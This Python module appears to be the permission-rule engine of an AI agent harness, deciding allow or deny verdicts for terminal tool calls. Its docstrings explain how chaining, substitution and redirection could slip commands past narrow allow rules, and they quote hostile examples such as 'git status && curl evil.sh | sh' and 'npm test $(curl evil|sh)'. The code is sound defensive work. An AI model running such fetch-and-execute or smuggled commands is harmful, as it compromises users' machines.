"""`permissions.json` rule matching against one tool call — the part
01-w2-interfaces.md §4.1 explicitly deferred: "match 是...不透明标识...W2 不做
glob/正则重叠判定——裁决引擎是 W3 FR05 的范围，这里只做'两条规则是否管同一件事'的
key 相等比较". This module IS that engine (Issue #11 / 02-w3-interfaces.md §1.1).

A rule's `match` is either:
  - an exact tool name (matches every call to that tool, and — for
    `action="allow"` — the ENTIRE command line that call carries, including
    any `&&`/`||`/`;`/`|`-joined tail; this is the intentional, broad "allow
    this whole tool" shape 02-w3-interfaces.md §1.1 documents), or
  - a command-prefix string, matched against ONE `&&`/`||`/`;`/`|`-delimited
    segment of a terminal call's `command` arg (see "segment-aware matching"
    below) by comparing the leading shlex tokens of `match` against the
    leading tokens of that segment (so `git push` matches a segment starting
    `git push --force origin`, but not `git pushxyz`); the first token of
    both `match` and the segment is compared by basename
    (`Path(tok).name`), so `curl` also matches a segment starting
    `/usr/bin/curl`.

## Segment-aware matching (review findings #3/#8/#12, 2026-09-19)

The ORIGINAL version of this module compared a command-prefix `match`
against the FULL command TEXT's leading tokens — so a rule for `git status`
(or a `remember`-written rule for the exact command a user just clicked
"allow" on, `sessions/service.py::_remember_allow`) matched not just that
command but ANY command line that happened to START with it, including one
with a `&&`/`;`/`|`-joined tail smuggling in something else entirely (`git
status && curl evil.sh | sh` — the leading tokens are still `git status`,
`shlex` has no concept of `&&` as anything but an ordinary word). That is
exactly the "子串匹配打补丁式黑名单" shape 02-w3-interfaces.md §1.1 explicitly
says this engine must NOT be — the fix is to make the two verdicts symmetric
in what they can see, not to patch the symptom:

  - `deny`: matches if ANY top-level shell segment of the command matches a
    deny rule (so a `deny "curl"` rule still catches `echo hi && curl
    evil.com`, not just a command starting with `curl` — finding #12).
  - `allow`: matches only if EVERY top-level shell segment is independently
    covered by SOME allow rule (a blanket exact-tool-name `allow` covers
    every segment by construction, matching 02-w3-interfaces.md §1.1's
    documented shape for it; a command-prefix `allow` rule like `git status`
    covers only the ONE segment it actually matches — `git status && curl
    evil.com` therefore fails to reach a full allow verdict, since the
    second segment isn't covered by anything, and correctly falls through to
    the review gate — findings #3/#8).

Self-contained (stdlib only) — see `__init__.py`'s module docstring;
`_split_shell_segments` is shared with `_hard_deny.py` (same package, same
"copied as one directory" unit — see that module's docstring for why an
inter-sibling import here is fine).

## Command substitution / redirection inside a covered segment (review
## findings #3/#8, round 2, 2026-09-19)

Segment-aware matching (above) only splits on the FOUR shell operators
`_split_shell_segments` knows about. `$(...)`/backtick command substitution
and `>`/`>>` redirection are invisible to that split — `shlex` hands them
back as ordinary word tokens of whichever segment they sit in — so a
narrow, honestly-scoped allow rule like `{"match":"npm test","action":
"allow"}` (exactly what `sessions/service.py::_remember_allow` writes after
a user clicks "allow" on one specific command) still matched the LEADING
tokens of `npm test $(curl evil|sh)` or `npm test > ~/.zshrc` and returned
`allow` for the whole segment, substitution/redirection payload included —
zero-IPC execution of whatever was smuggled in, exactly the "记住的规则
被拼接绕过" shape #3/#8 already covered for `&&`/`;`/`|`, just via a
different joiner.

Two changes close this without touching what `_split_shell_segments` itself
returns (its "only the four operators are segment boundaries" contract
stays honest — inventing a fifth, informal boundary there would blur what
"a segment" means for every caller, `_hard_deny.py` included):

  - `_segment_has_unproven_construct`: a segment containing a token with
    `$(`, a backtick, or a bare `<`/`>` is never treated as "covered" by a
    command-prefix allow rule, however well its leading tokens match — the
    rule only ever proved the visible prefix safe, not whatever the
    substitution/redirection does. This does NOT weaken a blanket
    exact-tool-name allow (`{"match":"terminal","action":"allow"}`): that
    shape is documented above as an intentional "trust the whole tool"
    boundary the user opted into directly, not a narrow rule being
    stretched past what it was written for — out of scope for this finding.
  - `_deny_matches_segment`: the deny side has the mirror gap ("顺带一提" in
    the review) — `{"match":"curl","action":"deny"}` didn't catch `echo
    $(curl evil.com)` because `curl` is never the segment's LEADING token
    there. Deny is asked to be conservative (catch more, not less), so
    instead of merely refusing to cover the segment, it recurses: text
    found inside `$(...)`/backticks is re-split with the same
    `_split_shell_segments` and checked against the deny rules as its own
    segment(s), to a bounded depth (`_MAX_SUBSTITUTION_DEPTH`) matching
    `_hard_deny.py`'s own recursion cap. Best-effort, not a shell parser —
    see `_extract_substitution_texts`'s own docstring for how it degrades.
"""

from __future__ import annotations

import shlex
from pathlib import Path
from typing import Any, Literal

from . import _hard_deny

Action = Literal["allow", "deny"]

_MAX_SUBSTITUTION_DEPTH = 4  # mirrors _hard_deny._MAX_UNWRAP_DEPTH


def _command_text(tool_name: str, args: dict[str, Any]) -> str | None:
    if tool_name == "terminal":
        command = args.get("command")
        return command if isinstance(command, str) and command else None
    return None


def _match_tokens(match: str) -> list[str] | None:
    try:
        tokens = shlex.split(match, posix=True)
    except ValueError:
        return None
    return tokens or None


def _normalize_leading_program(tokens: list[str]) -> list[str]:
    """Basename-normalize just the first token (the program name) so a rule
    written as `curl` still matches a segment that spells it `/usr/bin/curl`
    (review finding #12) — mirrors `_hard_deny.py`'s own `Path(argv[0]).name`
    normalization, so the two gates agree on what "the same program" means."""
    if not tokens:
        return tokens
    out = list(tokens)
    out[0] = Path(out[0]).name
    return out


def _segment_matches(match_tokens: list[str], segment_tokens: list[str]) -> bool:
    if not match_tokens or len(segment_tokens) < len(match_tokens):
        return False
    candidate = segment_tokens[: len(match_tokens)]
    return _normalize_leading_program(candidate) == _normalize_leading_program(match_tokens)


def _segment_has_unproven_construct(segment_tokens: list[str]) -> bool:
    """Whether any token in this segment carries a command/process
    substitution (`$(`, backtick, `<(`, `>(`) or a redirection operator
    (`>`, `>>`, `<`) — see the module docstring's "Command substitution /
    redirection inside a covered segment" section. Deliberately a substring
    check, not an exact-token one: `>file` (no space) and `test>5` are just
    as unproven as a standalone `>` token, and over-flagging here only ever
    costs an escalation to the review gate, never a false deny — the same
    "宁可误拒不可漏挡"-style bias `command_touches_protected_path` documents
    for itself in `_hard_deny.py`."""
    return any(c in tok for tok in segment_tokens for c in ("$(", "`", "<", ">"))


def _extract_substitution_texts(segment_tokens: list[str]) -> list[str]:
    """Best-effort extraction of the raw text inside `$(...)` / backtick
    command substitutions embedded in a segment's tokens, so the deny check
    can look inside them (review finding #3/#8 round 2's deny-side mirror).
    Not a shell parser: tokens are rejoined with single spaces (the
    original whitespace is already gone once `shlex` has tokenized them),
    `$(...)` nesting is tracked by paren depth but backticks are not
    (nobody nests backtick substitutions), and an opener with no matching
    closer just extracts to the end of the text — degrading towards
    "extract too much, never too little", consistent with this module's
    fail-closed-on-deny bias."""
    text = " ".join(segment_tokens)
    out: list[str] = []
    idx = 0
    while True:
        dollar = text.find("$(", idx)
        tick = text.find("`", idx)
        starts = [p for p in (dollar, tick) if p != -1]
        if not starts:
            break
        start = min(starts)
        if start == dollar:
            i = start + 2
            depth = 1
            while i < len(text) and depth > 0:
                if text[i] == "(":
                    depth += 1
                elif text[i] == ")":
                    depth -= 1
                i += 1
            inner = text[start + 2 : i - 1 if depth == 0 else i]
            idx = i
        else:
            end = text.find("`", start + 1)
            stop = end if end != -1 else len(text)
            inner = text[start + 1 : stop]
            idx = stop + 1
        if inner.strip():
            out.append(inner)
    return out


def _deny_matches_segment(
    segment_tokens: list[str], deny_rules: list[list[str]], *, depth: int = _MAX_SUBSTITUTION_DEPTH
) -> bool:
    """Whether `segment_tokens` matches a deny rule directly, OR any command
    hidden inside a `$(...)`/backtick substitution embedded in it does
    (recursively, bounded by `depth` — mirrors `_hard_deny._expand_wrapped_
    argv`'s own recursion cap)."""
    if any(_segment_matches(match_tokens, segment_tokens) for match_tokens in deny_rules):
        return True
    if depth <= 0:
        return False
    for inner_text in _extract_substitution_texts(segment_tokens):
        for inner_segment in _hard_deny._split_shell_segments(inner_text) or []:
            if inner_segment and _deny_matches_segment(
                inner_segment, deny_rules, depth=depth - 1
            ):
                return True
    return False


def _command_prefix_rules(
    rules: list[dict[str, Any]], tool_name: str, action: Action
) -> list[list[str]]:
    """Every rule's `match`, pre-tokenized, that names `action` and is NOT
    the bare tool name (those are handled separately — they apply to the
    whole call, not one shell segment). Rules with unparseable/empty `match`
    text are skipped (never treated as a wildcard match)."""
    out = []
    for rule in rules:
        if not isinstance(rule, dict):
            continue  # review finding #11: a malformed rules.json shape
            # (e.g. a bare string instead of an object) must be skipped, not
            # raise — `_on_pre_tool_call`'s new top-level fail-closed wrapper
            # is the last line of defense, this is the honest first one.
        match, rule_action = rule.get("match"), rule.get("action")
        if not isinstance(match, str) or rule_action != action or match == tool_name:
            continue
        tokens = _match_tokens(match)
        if tokens is not None:
            out.append(tokens)
    return out


def decide(rules: list[dict[str, Any]], tool_name: str, args: dict[str, Any]) -> Action | None:
    """Return `"deny"`/`"allow"` if this call is covered, `None` if nothing
    applies. See the module docstring's "segment-aware matching" section for
    the deny-any-segment / allow-every-segment asymmetry and why it exists."""
    if not isinstance(rules, list):
        return None
    tool_name_actions = {
        rule.get("action")
        for rule in rules
        if isinstance(rule, dict) and rule.get("match") == tool_name
        and rule.get("action") in ("allow", "deny")
    }
    if "deny" in tool_name_actions:
        return "deny"
    allow_whole_tool = "allow" in tool_name_actions

    command = _command_text(tool_name, args)
    if command is None:
        return "allow" if allow_whole_tool else None

    segments = [seg for seg in (_hard_deny._split_shell_segments(command) or []) if seg]
    if not segments:
        # Unparseable (or empty) command text: a command-prefix rule can't
        # be safely evaluated segment-by-segment against it — only the
        # blanket exact-tool-name verdict above still applies (never widen
        # by pretending an unparseable command has zero segments to cover).
        return "allow" if allow_whole_tool else None

    deny_rules = _command_prefix_rules(rules, tool_name, "deny")
    for segment in segments:
        if _deny_matches_segment(segment, deny_rules):
            return "deny"

    if allow_whole_tool:
        return "allow"

    allow_rules = _command_prefix_rules(rules, tool_name, "allow")
    for segment in segments:
        if _segment_has_unproven_construct(segment):
            # A command-prefix allow rule only ever proved the segment's
            # visible leading tokens safe — a $(...)/backtick/redirection
            # payload riding along is unproven, never "covered" (review
            # findings #3/#8, round 2). Escalate to the review gate instead
            # of silently widening what the rule was actually written for.
            return None
        if not any(_segment_matches(match_tokens, segment) for match_tokens in allow_rules):
            return None  # at least one segment isn't covered by any allow rule
    return "allow"
